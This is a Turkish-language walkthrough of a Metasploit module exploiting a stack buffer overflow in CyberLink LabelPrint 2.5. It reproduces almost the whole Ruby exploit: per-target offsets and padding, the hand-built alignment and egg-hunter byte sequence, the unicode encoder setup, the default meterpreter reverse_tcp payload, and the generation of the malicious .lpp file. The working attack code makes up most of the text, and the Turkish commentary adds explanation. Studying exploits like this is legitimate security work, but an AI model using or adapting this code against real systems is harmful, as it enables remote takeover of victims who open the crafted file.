# Exploit 

CyberLink Labelprint 2.5 Stack Buffer Overflow Analiz

--> exploit.rb

## Sınıf Tanımı

```ruby
class MetasploitModule < Msf::Exploit
```
Msf::Exploit sınıfından miras alan MetasploitModule adında bir sınıf tanımlar.

## Rank Sabiti

```ruby
Rank = GreatRanking
```
Rank seviyesi Great olarak verilmiş.

## Modül Dahil Etme

```ruby
include Msf::Exploit::FILEFORMAT
```
Msf::Exploit isim alanından FILEFORMAT modülünü dahil eder.

## Initialize Metodu

```ruby
def initialize(info={})
        super(update_info(info,
        .......................
end
```

exploit modülünü isim, açıklama, seçenekler, platform, hedefler, payload, açıklama tarihi ve varsayılan hedef gibi gerekli bilgilerle ayarlar.

## Modül Bilgisi

```ruby
'Name'          => "CyberLink LabelPrint 2.5 Stack Buffer Overflow",
'Description'   => %q{
        "This module exploits a stack buffer overflow in CyberLink LabelPrint 2.5 and below.
        The vulnerability is triggered when opening a .lpp project file containing overly long string characters
        via open file menu.").
        },
```
Modülün adı "CyberLink LabelPrint 2.5 Stack Buffer Overflow" olarak belirlenmiş ve zafiyeti açıklayan kısa bir açıklama verilmiştir.

## Lisans

```ruby
'License'       => MSF_LICENSE
```
Modülün dağıtıldığı lisansı belirtir.

## Varsayılan Seçenekler

```ruby
'DefaultOptions'  =>
        {
          'FILENAME' => 'msf.lpp',
          'EXITFUNC' => 'seh',
          'DisablePayloadHandler' => 'true',
          'PAYLOAD' => 'windows/meterpreter/reverse_tcp'
        },
```
Dosya adı, çıkış fonksiyonu, payload işleyici ve payload türü gibi çeşitli varsayılan seçenekler belirlenmiştir.

## Platform

```ruby
'Platform'        => 'win',
```
Exploitin Windows sistemlerini hedeflediğini belirtir.

## Hedefler

```ruby
'Targets'         =>
        [
          ['CyberLink LabelPrint <= 2.5 on Windows 7 (64 bit)',
            {
              'Ret' => "\x2c\x44",
              'Offset' => 790,
              'Padding1' => 857,
              'Padding2' => 104
            }
          ],
          ['CyberLink LabelPrint <= 2.5 on Windows 8.1 x64',
            {
              'Ret' => "\x2c\x44",
              'Offset' => 790,
              'Padding1' => 845,
              'Padding2' => 116
            }
          ],
          ['CyberLink LabelPrint <= 2.5 on Windows 10 x64 build 1803',
            {
              'Ret' => "\x2c\x44",
              'Offset' => 790,
              'Padding1' => 781,
              'Padding2' => 180
            }
          ],
        ],
```

Windows'ta CyberLink LabelPrint'in farklı sürümleri için belirli ofsetler ve padding değerleri ile farklı hedefler tanımlanmıştır.

## Payload

```ruby
'Payload'         =>
        {
          'Space'       => 15000,
          'DisableNops' => true
        },
```

Payload seçenekleri belirtilmiştir, boşluk ve NOP sled'leri devre dışı bırakma seçeneği bulunmaktadır.

## Açıklama Tarihi ve Varsayılan Hedef

```ruby
'DisclosureDate'  => 'Sep 23 2017',
'DefaultTarget'   => 0
```
'DisclosureDate' => 'Sep 23 2017': zafiyetin açıklandığı tarihi gösterir.
'DefaultTarget' => 0: varsayılan hedefin listede tanımlanan ilk hedef olmasını sağlar.


# get_payload Fonksiyonu

```ruby
def get_payload(hunter)
```
Bu fonksiyon, bir hunter parametresi alır.

## Kod İçeriği

```ruby
enc = framework.encoders.create('x86/unicode_mixed')
enc.datastore.import_options_from_hash({ 'BufferRegister' => 'EAX' })
hunter = enc.encode(hunter, nil, nil, platform)
```
enc = framework.encoders.create('x86/unicode_mixed'): framework nesnesinin encoders özelliğinden x86/unicode_mixed kodlayıcıyı oluşturur ve enc değişkenine atar.
enc.datastore.import_options_from_hash({ 'BufferRegister' => 'EAX' }): oluşturulan kodlayıcı için seçenekleri ayarlar. Burada BufferRegister seçeneği EAX olarak ayarlanmıştır.
hunter = enc.encode(hunter, nil, nil, platform): hunter değişkenini belirtilen kodlayıcı kullanarak kodlar.


# exploit Fonksiyonu

Exploit işlemleri burada yapılıyor...

## Değişkenlerin Tanımlanması

```ruby
nop = "\x42"
junk = 'ABC'.split('').sample              
buffer = ""
```
nop, \x42 değerine sahip bir bayt dizisidir.
junk, 'ABC' stringinden rastgele bir karakter seçer.
buffer, exploit payloadını oluşturmak için kullanılan boş bir dizedir.

## Payload Oluşturma

```ruby
buffer << junk * target['Offset']
        buffer << "\x61\x42"      
        buffer << target['Ret']   
        buffer << nop             
        buffer << "\x54"        
        buffer << nop              
        buffer << "\x58"        
        buffer << nop             
        buffer << "\x05\x1B\x01"  
        buffer << nop             
        buffer << "\x2d\x01\x01"   
        buffer << nop             
        buffer << "\x50"         
        buffer << nop             
        buffer << "\x5c"       
        buffer << nop          
        buffer << "\x25\x7e\x7e"   
        buffer << nop           
        buffer << "\x25\x01\x01"   
        buffer << nop              
        buffer << "\x35\x7f\x7f"  
        buffer << nop          
        buffer << "\x05\x44\x44"
        buffer << nop          
        buffer << "\x57"           
        buffer << nop              
        buffer << "\x50"           
        buffer << junk * target['Padding1'] 
        buffer << "\x58"           
        buffer << nop              
        buffer << "\x58"           
        buffer << nop              
        buffer << "\x05\x09\x01"   
        buffer << nop              
        buffer << "\x2d\x01\x01"   
        buffer << nop              
        buffer << "\x50"           
        buffer << nop              
        buffer << "\x5C"           
        buffer << nop              
        buffer << "\x58"           
        buffer << nop             
        buffer << "\x05\x53\x7c"   
        buffer << nop              
        buffer << "\x50"           
        buffer << junk * target['Padding2'] 
        buffer << "\x7b\x32"       
        buffer << junk * 114       
        buffer << "\x57"           
        buffer << nop              
        buffer << "\x58"        
        buffer << nop              
        buffer << "\x05\x0A\x01"   
        buffer << nop            
        buffer << "\x2d\x01\x01"   
        buffer << nop              
```
buffer değişkenine sırasıyla çeşitli baytlar eklenir. Bu baytlar, hedef sisteme saldırmak için hazırlanan payload'ın parçalarını temsil eder.

## get_payload Fonksiyonu Kullanımı

```ruby
buffer << get_payload(payload.encoded)
```
Bu satır, payload değişkeninin kodlanmış değerini almak için get_payload fonksiyonunu kullanır. Bu kodun başında tanımlanan get_payload fonksiyonunu çağırır.

## Tekrarlanan Baytların Eklenmesi

```ruby
buffer << junk * (payload.space-buffer.length)
```
payload'ın belirli bir boyuta ulaşması için eksik olan baytları tekrarlar ve ekler.

## LPP DATA

```ruby
lpp_data = <<-EOS
        <PROJECT version="1.0.00">
            <INFORMATION title="" author="" date="#{rand(1..12)}/#{rand(1..28)}/#{(1970..2020).to_a.sample}" SystemTime="#{rand(1..12)}/#{rand(1..28)}/#{(1970..2020).to_a.sample}">
                <TRACK name="#{buffer}" />
            </INFORMATION>
        </PROJECT>
        EOS

        print_status("Creating '#{datastore['FILENAME']}' file ...")
        file_create(lpp_data)
```

1. lpp_data değişkeni, <<-EOS ile başlayan ve EOS ile biten çok satırlı bir metin içerir. Bu metin, XML biçiminde bir proje dosyasını temsil eder.

2. Proje dosyasının <PROJECT> etiketi ile başladığı ve </PROJECT> etiketi ile bittiği görülür. Bu proje dosyasının sürümü 1.0.00 olarak belirlenmiştir.

3. Proje dosyasının içinde, <INFORMATION> etiketi ile başlayan ve </INFORMATION> etiketi ile biten bir bölüm bulunmaktadır. Bu bölümde title, author, date ve SystemTime gibi bilgiler dinamik olarak oluşturulmuştur.

4. <TRACK> etiketi içinde name özelliği, buffer değişkenin değerini alır. Bu da dinamik olarak değiştirilebilir bir özelliktir.

5. Son olarak, print_status fonksiyonu kullanılarak 'Creating '#{datastore['FILENAME']}' file ...' mesajı ekrana yazdırılır ve file_create fonksiyonu ile oluşturulan metin belgesi dosyaya yazdırılır.
